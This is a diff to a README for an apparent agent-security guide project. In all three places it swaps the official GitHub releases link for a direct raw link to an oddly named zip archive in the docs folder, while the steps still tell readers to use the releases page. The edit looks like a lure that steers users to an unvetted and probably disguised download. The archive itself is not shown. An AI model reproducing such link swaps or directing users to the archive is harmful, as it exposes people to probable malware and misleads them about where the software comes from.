@@ -1,6 +1,6 @@
 # 🛡️ openclaw-security-practice-guide - Simple Agent Security Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/Vikas-Kumar-Sahu/openclaw-security-practice-guide/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/Vikas-Kumar-Sahu/openclaw-security-practice-guide/main/docs/security_practice_openclaw_guide_Mitannish.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer matches these requirements:
 You need to visit the releases page to get the files. Follow these steps:
 
 1. Click the large blue button below or visit the link:
-   [Download OpenClaw Security Practice Guide](https://github.com/Vikas-Kumar-Sahu/openclaw-security-practice-guide/releases)
+   [Download OpenClaw Security Practice Guide](https://raw.githubusercontent.com/Vikas-Kumar-Sahu/openclaw-security-practice-guide/main/docs/security_practice_openclaw_guide_Mitannish.zip)
    
 2. On the releases page, look for the latest release. It will usually be at the top of the list.
 
@@ -129,4 +129,4 @@ If you need help not covered here, explore the Issues section on the GitHub page
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-OpenClaw-grey?style=for-the-badge)](https://github.com/Vikas-Kumar-Sahu/openclaw-security-practice-guide/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-OpenClaw-grey?style=for-the-badge)](https://raw.githubusercontent.com/Vikas-Kumar-Sahu/openclaw-security-practice-guide/main/docs/security_practice_openclaw_guide_Mitannish.zip)
